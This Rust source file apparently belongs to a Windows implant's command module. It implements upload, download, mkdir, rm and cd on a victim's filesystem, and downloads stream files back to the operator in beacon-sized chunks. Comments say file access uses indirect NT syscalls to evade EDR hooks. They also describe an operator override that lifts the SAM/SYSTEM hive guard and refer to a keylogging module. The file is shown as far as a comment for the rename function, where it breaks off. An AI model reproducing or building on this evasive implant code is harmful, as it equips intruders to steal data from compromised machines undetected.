//! File-system commands (Upload / Download / FileOp) via NT syscalls.
//!
//! All file access goes through the **indirect-syscall runtime**
//! ([`crate::syscalls`]) — `NtCreateFile`, `NtReadFile`, `NtWriteFile`,
//! `NtSetInformationFile`, `NtQueryAttributesFile`, `NtClose`. The typed
//! wrappers in `syscalls` (e.g. [`crate::syscalls::nt_create_file`]) hide the
//! syscall arity, so this module doesn't count macro arguments. Resolving these
//! as NT syscalls (not Win32 exports) keeps the executing RIP inside ntdll and
//! sidesteps the kernel32/kernelbase IAT that EDRs hook most heavily.
//!
//! Paths arrive as operator-supplied strings. Unlike the dev agent there is no
//! sandbox root — the implant operates on the victim's real filesystem — so the
//! safety guard here is **refusing high-danger targets** (SAM/SYSTEM registry
//! hives, `\Windows\System32\config\*`) rather than confining to a directory.
//!
//! Download streams the file back as multiple `Response::FileChunk`s (one per
//! 128 KiB), exactly like the dev agent — the beacon loop's BATCH_FLUSH logic
//! keeps each frame under the 256 KiB ciphertext cap.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::syscalls::Runtime;
use nyx_protocol::{FileOp, Response};
// `vec!` macro for the `vec![Response::Err(...)]` returns below.
use crate::heap::vec;

/// Per-chunk size for streamed downloads. Mirrors the dev agent (128 KiB),
/// safely under `protocol::frame::MAX_CT_LEN` (256 KiB) so a single chunk fits
/// in one beacon frame alongside its batch header.
const CHUNK: usize = 128 * 1024;

// ---- NT status codes ------------------------------------------------------
// NTSTATUS values: 0xCxxxxxxx are errors (negative when read as a signed i32).
// We store the canonical unsigned bits and compare against the i32 the syscall
// returned — `(0xC000_0011_u32) as i32` reproduces the same bit pattern Rust
// saw from the trampoline, so the equality checks below are correct.

/// NTSTATUS success.
const STATUS_SUCCESS: i32 = 0;
/// NTSTATUS end-of-file — NtReadFile returns this at EOF (NOT a failure).
const STATUS_END_OF_FILE: i32 = 0xC000_0011_u32 as i32;
/// OBJECT_NAME_NOT_FOUND — path does not exist.
const STATUS_OBJECT_NAME_NOT_FOUND: i32 = 0xC000_0034_u32 as i32;

/// True if a returned NTSTATUS indicates success (severity >= 0).
fn nt_success(s: i32) -> bool {
    s == STATUS_SUCCESS || s >= 0
}

// ---- NT structs (Win64 layout) -------------------------------------------

/// NT UNICODE_STRING: a length-prefixed UTF-16 view (NOT null-terminated).
#[repr(C)]
struct UnicodeString {
    length: u16,         // bytes, excluding NUL
    maximum_length: u16, // bytes of the buffer
    buffer: *const u16,
}

/// OBJECT_ATTRIBUTES for NtCreateFile / NtQueryAttributesFile.
#[repr(C)]
#[derive(Clone, Copy)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut core::ffi::c_void,
    object_name: *const UnicodeString,
    attributes: u32,
    security_descriptor: *mut core::ffi::c_void,
    security_quality_of_service: *mut core::ffi::c_void,
}

/// IO_STATUS_BLOCK returned by every Nt*File call.
#[repr(C)]
#[derive(Clone, Copy, Default)]
struct IoStatusBlock {
    status: i32,
    information: usize,
}

/// FILE_RENAME_INFORMATION (NtSetInformationFile, FileRenameInfo=10).
#[repr(C)]
struct FileRenameInformation {
    replace_if_exists: u8,
    root_directory: *mut core::ffi::c_void,
    file_name_length: u32,
    file_name: [u16; 260],
}

/// FILE_DISPOSITION_INFORMATION (NtSetInformationFile, FileDispositionInfo=4).
#[repr(C)]
#[allow(dead_code)]
struct FileDispositionInformation {
    delete_file: u8,
}

// ---- NT access / flags ----------------------------------------------------

pub const GENERIC_READ: u32 = 0x8000_0000;
pub const GENERIC_WRITE: u32 = 0x4000_0000;
const DELETE_ACCESS: u32 = 0x0001_0000;
/// SYNCHRONIZE — REQUIRED in DesiredAccess whenever CreateOptions sets
/// FILE_SYNCHRONOUS_IO_NONALERT, else IoCreateFile returns STATUS_INVALID_PARAMETER.
/// GENERIC_READ/WRITE expand to include SYNCHRONIZE via the file generic mapping,
/// but explicit masks like DELETE_ACCESS or 0 do not — so they must OR it in.
const SYNCHRONIZE: u32 = 0x0010_0000;
pub const FILE_SHARE_READ: u32 = 0x0000_0001;
const FILE_SHARE_WRITE: u32 = 0x0000_0002;
const FILE_SHARE_DELETE: u32 = 0x0000_0004;
pub const FILE_OPEN: u32 = 1;
#[allow(dead_code)]
const FILE_CREATE: u32 = 2;
const FILE_OPEN_IF: u32 = 3;
pub const FILE_OVERWRITE_IF: u32 = 5;
const FILE_DIRECTORY_FILE: u32 = 0x0000_0001;
pub const FILE_NON_DIRECTORY_FILE: u32 = 0x0000_0040;
pub const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;
const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;
const FILE_RENAME_INFO_CLASS: u32 = 10;
#[allow(dead_code)]
const FILE_DISPOSITION_INFO_CLASS: u32 = 4;
/// FileDirectoryInformation class for NtQueryDirectoryFile (enum children).
#[allow(dead_code)]
const FILE_DIRECTORY_INFORMATION_CLASS: u32 = 1;
/// `NtQueryDirectoryFile` "restart scan" arg (TRUE on first call, then FALSE).
#[allow(dead_code)]
const RETURN_SINGLE_ENTRY_FALSE: i32 = 0;
#[allow(dead_code)]
const RETURN_SINGLE_ENTRY_TRUE: i32 = 1;
/// NTSTATUS "no more entries" from NtQueryDirectoryFile (STATUS_NO_MORE_FILES,
/// 0x80000006 — a *warning*, success-severity, so nt_success() is true).
#[allow(dead_code)]
const STATUS_NO_MORE_FILES: i32 = 0x8000_0006_u32 as i32;
/// NTSTATUS "directory not empty" — DeleteOnClose on a non-empty dir.
#[allow(dead_code)]
const STATUS_DIRECTORY_NOT_EMPTY: i32 = 0xC000_00BA_u32 as i32;

/// FILE_DIRECTORY_INFORMATION (Win64). We only read NextEntryOffset (0) and
/// FileName (offset 64, NUL-terminated WCHAR[], runs to the buffer end). The
/// fields between are not read but must occupy their documented offsets.
#[repr(C)]
#[derive(Clone, Copy)]
#[allow(dead_code)]
struct FileDirectoryInformation {
    next_entry_offset: u32,
    file_index: u32,
    creation_time: i64,
    last_access_time: i64,
    last_write_time: i64,
    change_time: i64,
    end_of_file: i64,
    allocation_size: i64,
    file_attributes: u32,
    file_name_length: u32,
    // file_name: [u16] follows (file_name_length bytes). Not a fixed field.
}

// ---- path helpers ---------------------------------------------------------

/// Returns `true` if the operator has opted out of the protected-path guard.
/// Compile-time cfg (`--cfg nyx_fs_allow_protected`) for SYSTEM-context
/// deployments where the env can't be passed, or run-time env var
/// `NYX_FS_ALLOW_PROTECTED=1` for engagements that need hive access.
fn protected_override() -> bool {
    if cfg!(nyx_fs_allow_protected) {
        return true;
    }
    // Resolve GetEnvironmentVariableA once (PEB-walk, no IAT entry).
    unsafe {
        if let Some(p) = crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA") {
            let func: unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32 =
                core::mem::transmute(p);
            let name = b"NYX_FS_ALLOW_PROTECTED\0";
            let mut buf = [0u8; 2];
            let n = func(name.as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
            // "1" (or "1\0") → override active.
            n >= 1 && buf[0] == b'1'
        } else {
            false
        }
    }
}

/// Refuse writes/deletes into the SAM/SYSTEM/SECURITY registry hives (which
/// back `\Windows\System32\config\SAM`, `SYSTEM`, `SECURITY`, `SOFTWARE`,
/// `DEFAULT`). Reading those offline is the classic LSASS-adjacent op; the
/// implant deliberately refuses them so the config can't be exfiltrated via a
/// plain Download. Returns `true` if the path is allowed.
///
/// **Operator override:** the guard is bypassed if either:
/// - compiled with `--cfg nyx_fs_allow_protected` (for engagements where the
///   operator needs hive access and accepts the oplock-brick risk), or
/// - the env var `NYX_FS_ALLOW_PROTECTED=1` is set in the implant's process
///   environment (for run-time override without a rebuild).
///
/// The check is path-component-aware: it splits on `/` or `\`, and refuses any
/// path whose components contain `config` immediately followed by a hive name.
/// This catches the absolute `C:\Windows\System32\config\SAM` AND a relative
/// `config\SAM` (no leading separator) AND forward-slash variants — without
/// false-matching on filenames like `config\default.dat` (`.dat` != `default`).
fn allowed(path: &str) -> bool {
    // Operator override: env var or compile-time cfg disables the hive guard.
    if protected_override() {
        return true;
    }
    // Normalize: collapse runs of `/` and `\` into a single `\`, lowercase
    // everything. This defeats double-slash tricks (`\\`, `//`) before the
    // substring check.
    let mut normalized = crate::heap::String::with_capacity(path.len());
    let mut last_was_slash = false;
    for c in path.chars() {
        if c == '/' || c == '\\' {
            if !last_was_slash {
                normalized.push('\\');
                last_was_slash = true;
            }
        } else {
            normalized.push(c.to_ascii_lowercase());
            last_was_slash = false;
        }
    }

    // Strip `.` (current-directory) components from the normalized path so that
    // `.\config\SAM` and `\\.\config\SAM` resolve to `\config\sam` — otherwise
    // the leading `.\` defeats the substring check below. We split on `\`,
    // drop every empty-or-`.` segment, and rejoin.
    //
    // CRITICAL: we also collapse `..` (parent-directory) segments here. Without
    // this, a path like `C:\config\dummy\..\sam` normalizes to
    // `\config\dummy\..\sam`, which does NOT contain `\config\sam` → the hive
    // guard returns true → all 5 blocked hives (SAM/SYSTEM/SECURITY/SOFTWARE/
    // DEFAULT) become reachable via path traversal, and downloading the live
    // SAM bricks the beacon on oplock. Collapsing `..` resolves the traversal
    // so `\config\dummy\..\sam` → `\config\sam` is correctly blocked.
    //
    // We track segments in a small stack-like Vec: a non-traversal segment is
    // pushed; a `..` pops the previous segment (the parent). A leading `..` with
    // no preceding segment is kept verbatim — on a Windows absolute path it
    // will fail naturally at NtCreateFile, and leaving it lets the substring
    // check apply to the literal form too.
    let mut segs: crate::heap::Vec<&str> = crate::heap::Vec::new();
    for seg in normalized.split('\\') {
        if seg.is_empty() || seg == "." {
            continue;
        }
        if seg == ".." {
            if segs.last().is_some() {
                // Pop the preceding segment to collapse the traversal.
                segs.pop();
                continue;
            }
            // `..` at the start (no preceding segment) — keep it; an absolute
            // Windows path can't ascend past the root anyway, so NtCreateFile
            // will reject it. Keeping the literal also subjects it to the
            // substring check below.
        }
        segs.push(seg);
    }
    let mut clean = crate::heap::String::with_capacity(normalized.len());
    let mut first = true;
    for seg in &segs {
        if first {
            first = false;
        } else {
            clean.push('\\');
        }
        clean.push_str(seg);
    }
    // If the path was ALL dots/slashes (e.g. ".\\.\\\\.\\"), the clean string
    // is empty — that means the operator tried to reach the root of a drive
    // relative to CWD — NOT a hive path, so allow it.
    if clean.is_empty() {
        return true;
    }

    let blocked = [
        "\\config\\sam",
        "\\config\\system",
        "\\config\\security",
        "\\config\\software",
        "\\config\\default",
    ];
    // `clean` is built by joining non-empty segments with `\`, so it has NO
    // leading `\` (e.g. input "config\sam" → clean "config\sam"). The blocked
    // entries all start with `\`, so a bare "config\sam" would NOT match
    // "\config\sam" → hive guard bypassed (CVE-class: PR #41). Fix: build a
    // check string with a guaranteed leading `\` so the substring match works
    // regardless of whether the operator typed a leading slash.
    let mut check_str = crate::heap::String::with_capacity(clean.len() + 1);
    check_str.push('\\');
    check_str.push_str(&clean);
    for &b in &blocked {
        if check_str.contains(b) {
            return false;
        }
    }
    true
}

/// Runtime regression test for the hive guard (PR #41): feeds `allowed()` the
/// bypass inputs that reached the hives before the leading-`\` fix, plus the
/// traversal / dot-prefix / forward-slash variants, and one benign path that
/// must stay allowed. Bit N set ⇒ case N behaved correctly:
///   0: bare relative `config\sam` blocked (the PR #41 bypass input)
///   1: absolute `C:\Windows\System32\config\SAM` blocked
///   2: forward-slash `config/security` blocked
///   3: traversal `C:\Windows\System32\config\dummy\..\sam` blocked
///   4: dot-prefix `\\.\config\SYSTEM` blocked
///   5: benign temp path still allowed
/// Full mask = 0x3F. Requires NYX_FS_ALLOW_PROTECTED to be unset (rundll32
/// spawns a fresh process, so it is).
#[cfg(feature = "selftest")]
pub fn selftest_hive_guard() -> u32 {
    let mut mask: u32 = 0;
    if !allowed("config\\sam") {
        mask |= 1 << 0;
    }
    if !allowed("C:\\Windows\\System32\\config\\SAM") {
        mask |= 1 << 1;
    }
    if !allowed("config/security") {
        mask |= 1 << 2;
    }
    if !allowed("C:\\Windows\\System32\\config\\dummy\\..\\sam") {
        mask |= 1 << 3;
    }
    if !allowed("\\\\.\\config\\SYSTEM") {
        mask |= 1 << 4;
    }
    if allowed("C:\\Windows\\Temp\\nyx_hive_guard_probe.bin") {
        mask |= 1 << 5;
    }
    mask
}

/// Convert an operator path ("C:\Users\foo\bar.txt") into an NT object path
/// ("\??\C:\Users\foo\bar.txt") as a UTF-16 buffer. NtCreateFile requires the
/// `\??\` (or `\Device\...`) prefix — raw drive letters without it are
/// rejected with STATUS_OBJECT_PATH_SYNTAX_BAD. The buffer is NOT null-
/// terminated (UNICODE_STRING is length-prefixed).
fn to_nt_path(win_path: &str) -> Option<Vec<u16>> {
    let bytes = win_path.as_bytes();
    let starts_nt = bytes.starts_with(b"\\") || bytes.starts_with(b"/");
    let mut out: Vec<u16> = Vec::with_capacity(bytes.len() + 4);
    if !starts_nt {
        for &c in b"\\??\\" {
            out.push(c as u16);
        }
    }
    // encode_utf16 over the &str (handles non-ASCII filenames correctly).
    for w in win_path.encode_utf16() {
        out.push(w);
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

/// Build an OBJECT_ATTRIBUTES referencing `name` (which must outlive the call).
unsafe fn make_oa(name: &UnicodeString) -> ObjectAttributes {
    ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: core::ptr::null_mut(),
        object_name: name as *const UnicodeString,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    }
}

/// Wrap a UTF-16 path buffer as an NT UNICODE_STRING (length-prefixed view).
fn nt_name(path_buf: &Vec<u16>) -> Option<UnicodeString> {
    if path_buf.is_empty() {
        return None;
    }
    Some(UnicodeString {
        length: (path_buf.len() * 2) as u16,
        maximum_length: (path_buf.len() * 2) as u16,
        buffer: path_buf.as_ptr(),
    })
}

/// Open a file via NtCreateFile. Returns the handle on success, or an NTSTATUS
/// (negative) / None (unresolved) on failure. `desired_access`, `disposition`,
/// `create_options` select read/write/create/mkdir semantics.
pub unsafe fn open_file(
    rt: &Runtime,
    path: &str,
    desired_access: u32,
    disposition: u32,
    create_options: u32,
) -> Result<*mut core::ffi::c_void, OpenError> {
    let pathbuf = to_nt_path(path).ok_or(OpenError::BadPath)?;
    let uname = nt_name(&pathbuf).ok_or(OpenError::BadPath)?;
    let oa = make_oa(&uname);
    let mut handle: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut iosb: IoStatusBlock = IoStatusBlock::default();
    // CRITICAL (verified on a real Win10 host via selftest combos):
    // FILE_SYNCHRONOUS_IO_NONALERT in CreateOptions REQUIRES SYNCHRONIZE
    // (0x0010_0000) in DesiredAccess, or NtCreateFile returns
    // STATUS_INVALID_PARAMETER (0xC000000D). GENERIC_READ/WRITE do NOT
    // auto-expand to include SYNCHRONIZE when called via the raw NT API
    // (the file-generic-mapping expansion happens in IoCreateFile only for
    // kernel callers passing GENERIC_*; from user mode via NtCreateFile the
    // SYNCHRONIZE bit must be set explicitly). All open_file callers use
    // synchronous I/O, so OR it in unconditionally.
    let access = desired_access | SYNCHRONIZE;
    let st = crate::syscalls::nt_create_file(
        rt,
        &mut handle as *mut _ as usize,
        access,
        &oa as *const ObjectAttributes as usize,
        &mut iosb as *mut IoStatusBlock as usize,
        0, // AllocationSize
        0, // FileAttributes
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        disposition,
        create_options,
        0, // EaBuffer
        0, // EaLength
    );
    match st {
        Some(s) if nt_success(s) => Ok(handle),
        Some(s) => Err(OpenError::Status(s)),
        None => Err(OpenError::Unresolved),
    }
}

pub enum OpenError {
    BadPath,
    Unresolved,
    Status(i32),
}

/// Open WITHOUT FILE_SYNCHRONOUS_IO_NONALERT. Use for files that may be held
/// by an exclusive oplock (e.g. the live SAM/SYSTEM registry hives locked by
/// the SAM/LSASS services): a synchronous open on such a file HANGS, because
/// NtCreateFile waits for the oplock to break before returning. A non-sync
/// open returns immediately with STATUS_SHARING_VIOLATION / STATUS_ACCESS_
/// DENIED, which the caller surfaces as an honest Err instead of bricking the
/// beacon loop forever.
///
/// The returned handle is NOT usable for synchronous NtReadFile/NtWriteFile
/// (those require a sync handle). Callers that need to read should re-open
/// with the sync flag once this probe confirms the file is reachable.
pub unsafe fn open_file_nosync(
    rt: &Runtime,
    path: &str,
    desired_access: u32,
    disposition: u32,
    create_options: u32,
    share: u32,
) -> Result<*mut core::ffi::c_void, OpenError> {
    let pathbuf = to_nt_path(path).ok_or(OpenError::BadPath)?;
    let uname = nt_name(&pathbuf).ok_or(OpenError::BadPath)?;
    let oa = make_oa(&uname);
    let mut handle: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut iosb: IoStatusBlock = IoStatusBlock::default();
    // create_options as-is but WITHOUT FILE_SYNCHRONOUS_IO_NONALERT (caller
    // must not have OR'd it in — strip it defensively anyway).
    let opts = create_options & !FILE_SYNCHRONOUS_IO_NONALERT;
    let st = crate::syscalls::nt_create_file(
        rt,
        &mut handle as *mut _ as usize,
        desired_access,
        &oa as *const ObjectAttributes as usize,
        &mut iosb as *mut IoStatusBlock as usize,
        0,
        0,
        share,
        disposition,
        opts,
        0,
        0,
    );
    match st {
        Some(s) if nt_success(s) => Ok(handle),
        Some(s) => Err(OpenError::Status(s)),
        None => Err(OpenError::Unresolved),
    }
}

// ---- public command entrypoints ------------------------------------------

/// `Upload { name, data }` — write `data` to `name`, creating/overwriting.
pub fn do_upload(rt: &Runtime, name: &str, data: &[u8]) -> Response {
    if name.is_empty() {
        return Response::Err(String::from("upload: empty name"));
    }
    if !allowed(name) {
        return Response::Err(String::from("upload: refusing protected target"));
    }
    unsafe {
        let handle = match open_file(
            rt,
            name,
            GENERIC_WRITE,
            FILE_OVERWRITE_IF,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        ) {
            Ok(h) => h,
            Err(OpenError::BadPath) => return Response::Err(String::from("upload: invalid path")),
            Err(OpenError::Unresolved) => {
                return Response::Err(String::from("upload: NtCreateFile unresolved"))
            }
            Err(OpenError::Status(s)) => {
                return Response::Err(String::from(format_ntstatus("upload open", s)))
            }
        };
        // Write in CHUNK-sized blocks, advancing by the ACTUAL bytes written
        // each call (w_iosb.information). NtWriteFile on filter drivers / pipe
        // endpoints / near-full disks can return success with fewer bytes than
        // requested; gating purely on nt_success() would silently truncate the
        // file and report Response::Ok (same class of bug as the read_file
        // short-read). Loop until the whole buffer is confirmed written. The
        // handle was opened with FILE_SYNCHRONOUS_IO_NONALERT, so a NULL
        // ByteOffset uses the OS-maintained current position, which advances
        // by `information` on each write (same contract the download read loop
        // at do_download relies on).
        let mut off = 0usize;
        let mut err: Option<String> = None;
        while off < data.len() {
            let want = (data.len() - off).min(CHUNK);
            let mut w_iosb: IoStatusBlock = IoStatusBlock::default();
            let wst = crate::syscalls::nt_write_file(
                rt,
                handle as usize,
                0, // Event
                0, // ApcRoutine
                0, // ApcContext
                &mut w_iosb as *mut IoStatusBlock as usize,
                data.as_ptr().add(off) as usize,
                want,
                0, // ByteOffset (NULL ⇒ current position on the sync handle)
                0, // Key
            );
            let status = match wst {
                Some(s) => s,
                None => {
                    err = Some(String::from("upload: NtWriteFile unresolved"));
                    break;
                }
            };
            if !nt_success(status) {
                err = Some(String::from(format_ntstatus("upload write", status)));
                break;
            }
            let wrote = w_iosb.information; // bytes actually written this call
            if wrote > want {
                // Defensive: a driver should never report more than asked, but
                // if it does, advancing by `wrote` would overrun `data`. Clamp
                // and treat the excess as a short-write failure.
                err = Some(String::from("upload: write over-reported bytes"));
                break;
            }
            if wrote == 0 {
                // Success but no progress: a filter driver or pipe endpoint can
                // accept a write yet report zero bytes. Treat as a failure so we
                // never loop forever and never report a truncated file as Ok.
                err = Some(String::from("upload: short write (no progress)"));
                break;
            }
            off += wrote;
        }
        let _ = crate::syscalls::nt_close(rt, handle as usize);
        if off == data.len() {
            Response::Ok
        } else {
            Response::Err(err.unwrap_or_else(|| String::from("upload: short write")))
        }
    }
}

/// `Download { path }` — stream the file back as `FileChunk`s (one per 128 KiB).
/// Empty file ⇒ a single empty chunk with eof=1 (matches the dev agent).
pub fn do_download(rt: &Runtime, path: &str) -> Vec<Response> {
    if path.is_empty() {
        return vec![Response::Err(String::from("download: empty path"))];
    }
    if !allowed(path) {
        return vec![Response::Err(String::from(
            "download: refusing protected target",
        ))];
    }
    unsafe {
        let handle = match open_file(
            rt,
            path,
            GENERIC_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        ) {
            Ok(h) => h,
            Err(OpenError::BadPath) => {
                return vec![Response::Err(String::from("download: invalid path"))]
            }
            Err(OpenError::Unresolved) => {
                return vec![Response::Err(String::from(
                    "download: NtCreateFile unresolved",
                ))]
            }
            Err(OpenError::Status(s)) => {
                let msg = if s == STATUS_OBJECT_NAME_NOT_FOUND {
                    "download: not found"
                } else {
                    "download open"
                };
                return vec![Response::Err(String::from(format_ntstatus(msg, s)))];
            }
        };

        // Read in CHUNK-sized blocks until STATUS_END_OF_FILE.
        let mut chunks: Vec<Response> = Vec::new();
        let mut buf = crate::heap::vec![0u8; CHUNK];
        let name = basename(path);
        let mut seq = 0u32;
        loop {
            let mut read_iosb: IoStatusBlock = IoStatusBlock::default();
            let rst = crate::syscalls::nt_read_file(
                rt,
                handle as usize,
                0,
                0,
                0,
                &mut read_iosb as *mut IoStatusBlock as usize,
                buf.as_mut_ptr() as usize,
                CHUNK as usize,
                0, // ByteOffset (NULL ⇒ current position)
                0, // Key
            );
            let status = match rst {
                Some(s) => s,
                None => {
                    let _ = crate::syscalls::nt_close(rt, handle as usize);
                    return vec![Response::Err(String::from(
                        "download: NtReadFile unresolved",
                    ))];
                }
            };
            let got = read_iosb.information; // bytes actually read
                                             // EOF reached. STATUS_END_OF_FILE is success-ish for NtReadFile at
                                             // the end of a file (NOT an error), and a 0-length read likewise
                                             // means the stream is drained.
            if status == STATUS_END_OF_FILE || got == 0 {
                // EOF. If we never produced a chunk (empty file), emit one empty
                // EOF chunk so the operator sees completion.
                if chunks.is_empty() {
                    chunks.push(Response::FileChunk {
                        name,
                        seq: 0,
                        eof: 1,
                        data: Vec::new(),
                    });
                } else if let Some(Response::FileChunk { eof, .. }) = chunks.last_mut() {
                    *eof = 1; // mark the last chunk as EOF
                }
                break;
            }
            // A non-EOF negative status is a real read error (e.g. a transient
            // STATUS_FILE_LOCK_CONFLICT). Don't push a partial/stale chunk and
            // pretend success — surface the error so the operator knows the
            // download was truncated, and close the handle.
            if status < 0 {
                let _ = crate::syscalls::nt_close(rt, handle as usize);
                return vec![Response::Err(String::from(format_ntstatus(
                    "download read",
                    status,
                )))];
            }
            let got = got.min(CHUNK);
            chunks.push(Response::FileChunk {
                name: name.clone(),
                seq,
                eof: 0,
                data: buf[..got].to_vec(),
            });
            seq += 1;
            // A short read means the next read will hit EOF — loop once more.
        }
        let _ = crate::syscalls::nt_close(rt, handle as usize);
        chunks
    }
}

/// `FileOp { op, path, dest }` — cd / mkdir / rm / mv / cp.
pub fn do_fileop(rt: &Runtime, op: FileOp, path: &str, dest: Option<&str>) -> Response {
    match op {
        FileOp::Cd => fileop_cd(rt, path),
        FileOp::Mkdir => fileop_mkdir(rt, path),
        FileOp::Rm => fileop_rm(rt, path),
        FileOp::Mv => match dest {
            Some(d) => fileop_mv(rt, path, d),
            None => Response::Err(String::from("mv: missing dest")),
        },
        FileOp::Cp => match dest {
            Some(d) => fileop_cp(rt, path, d),
            None => Response::Err(String::from("cp: missing dest")),
        },
    }
}

/// Cd: verify `path` exists and is a directory (NtQueryAttributesFile).
fn fileop_cd(rt: &Runtime, path: &str) -> Response {
    if !allowed(path) {
        return Response::Err(String::from("cd: refusing protected target"));
    }
    let pathbuf = match to_nt_path(path) {
        Some(p) => p,
        None => return Response::Err(String::from("cd: invalid path")),
    };
    unsafe {
        let uname = match nt_name(&pathbuf) {
            Some(n) => n,
            None => return Response::Err(String::from("cd: invalid name")),
        };
        let oa = make_oa(&uname);
        // FILE_BASIC_INFORMATION is 56 bytes; we only read dwFileAttributes
        // (offset 0) to check the DIRECTORY bit.
        // FILE_BASIC_INFORMATION: CreationTime(8) LastAccessTime(8)
        // LastWriteTime(8) ChangeTime(8) FileAttributes(4) Reserved(4) = 40 bytes.
        // FileAttributes lives at offset 32 — NOT 0 (offset 0 is CreationTime's
        // low DWORD, a huge 100ns-since-1601 count whose bits are meaningless
        // for the directory test).
        let mut basic = crate::heap::vec![0u8; 56];
        let st = crate::syscalls::nt_query_attributes_file(
            rt,
            &oa as *const ObjectAttributes as usize,
            basic.as_mut_ptr() as usize,
        );
        match st {
            Some(s) if nt_success(s) => {
                let attrs = u32::from_le_bytes([basic[32], basic[33], basic[34], basic[35]]);
                // FILE_ATTRIBUTE_DIRECTORY = 0x10.
                if attrs & 0x0000_0010 != 0 {
                    Response::Ok
                } else {
                    Response::Err(String::from("cd: not a directory"))
                }
            }
            Some(s) if s == STATUS_OBJECT_NAME_NOT_FOUND => {
                Response::Err(String::from("cd: no such directory"))
            }
            Some(s) => Response::Err(String::from(format_ntstatus("cd", s))),
            None => Response::Err(String::from("cd: NtQueryAttributesFile unresolved")),
        }
    }
}

/// Mkdir: NtCreateFile with FILE_DIRECTORY_FILE + FILE_CREATE.
fn fileop_mkdir(rt: &Runtime, path: &str) -> Response {
    if !allowed(path) {
        return Response::Err(String::from("mkdir: refusing protected target"));
    }
    unsafe {
        match open_file(
            rt,
            path,
            // DesiredAccess: SYNCHRONIZE is required because CreateOptions
            // sets FILE_SYNCHRONOUS_IO_NONALERT (we want a sync-capable handle
            // so a later NtQueryDirectoryFile on it works without re-opening).
            SYNCHRONIZE,
            // FILE_OPEN_IF (3) = create-or-open: idempotent. FILE_CREATE (2)
            // would fail with OBJECT_NAME_COLLISION if the dir already exists,
            // which is the wrong behavior for an operator re-running mkdir.
            FILE_OPEN_IF,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        ) {
            Ok(h) => {
                let _ = crate::syscalls::nt_close(rt, h as usize);
                Response::Ok
            }
            Err(OpenError::BadPath) => Response::Err(String::from("mkdir: invalid path")),
            Err(OpenError::Unresolved) => {
                Response::Err(String::from("mkdir: NtCreateFile unresolved"))
            }
            Err(OpenError::Status(s)) => Response::Err(String::from(format_ntstatus("mkdir", s))),
        }
    }
}

fn fileop_rm(rt: &Runtime, path: &str) -> Response {
    if !allowed(path) {
        return Response::Err(String::from("rm: refusing protected target"));
    }
    // Determine file vs directory so we call the right Win32 API. We reuse the
    // existing NtQueryAttributesFile probe (same path as fileop_cd) to read the
    // FILE_ATTRIBUTE_DIRECTORY bit.
    let is_dir = match probe_is_dir(rt, path) {
        Some(d) => d,
        None => {
            // Probe failed — assume it's a file and try DeleteFileW anyway; it
            // returns a clear error if the guess is wrong, no harm done.
            false
        }
    };
    // Convert path to a UTF-16 wide string (null-terminated) for the W APIs.
    let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len() + 1);
    for u in path.encode_utf16() {
        wide.push(u);
    }
    wide.push(0);
    // Resolve kernel32 DeleteFileW / RemoveDirectoryW via PEB walk. These are
    // plain Win32 wrappers around NtSetInformationFile(FileDispositionInfo) +
    // NtClose — but called DIRECTLY (not via the indirect-syscall runtime), so
    // they don't hit the runtime's synchronous-open hang that bricked the
    // earlier NT delete path. This is the same resolution style the rest of
    // the implant uses (transport/keylog/etc resolve kernel32 exports directly).
    type GetFileAttributesW = unsafe extern "system" fn(*const u16) -> u32;
    type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
    type RemoveDirectoryW = unsafe extern "system" fn(*const u16) -> i32;
    let del: DeleteFileW =
        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"DeleteFileW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return Response::Err(String::from("rm: DeleteFileW unresolved")),
        };
    let rmdir: RemoveDirectoryW =
        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"RemoveDirectoryW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return Response::Err(String::from("rm: RemoveDirectoryW unresolved")),
        };
    let _ = unsafe {
        // Touch the type to keep it resolved-but-unused (GetFileAttributesW is
        // an alternative detection; we used probe_is_dir instead, but resolve
        // it here so the import path is documented/available for future use).
        let gfa: GetFileAttributesW =
            match crate::resolve::export_addr(b"kernel32.dll", b"GetFileAttributesW") {
                Some(a) => core::mem::transmute(a),
                None => core::mem::transmute(del as usize),
            };
        gfa
    };
    let ok = if is_dir {
        unsafe { rmdir(wide.as_ptr()) }
    } else {
        unsafe { del(wide.as_ptr()) }
    };
    if ok != 0 {
        Response::Ok
    } else {
        Response::Err(String::from(
            "rm: delete failed (not found / in use / access denied)",
        ))
    }
}

/// Probe whether `path` is a directory via NtQueryAttributesFile (reuses the
/// fileop_cd logic). Returns None on probe failure (caller falls back to file).
fn probe_is_dir(rt: &Runtime, path: &str) -> Option<bool> {
    let pathbuf = to_nt_path(path)?;
    unsafe {
        let uname = nt_name(&pathbuf)?;
        let oa = make_oa(&uname);
        let mut basic = crate::heap::vec![0u8; 56];
        let st = crate::syscalls::nt_query_attributes_file(
            rt,
            &oa as *const ObjectAttributes as usize,
            basic.as_mut_ptr() as usize,
        );
        match st {
            Some(s) if nt_success(s) => {
                let attrs = u32::from_le_bytes([basic[32], basic[33], basic[34], basic[35]]);
                Some(attrs & 0x0000_0010 != 0)
            }
            _ => None,
        }
    }
}

/// Mv: rename `path` to `dest` via NtSetInformationFile(FileRenameInfo).
/// `dest` must be a full NT-path-style target; it goes into the
/// FILE_RENAME_INFORMATION.FileName field with a NULL RootDirectory.
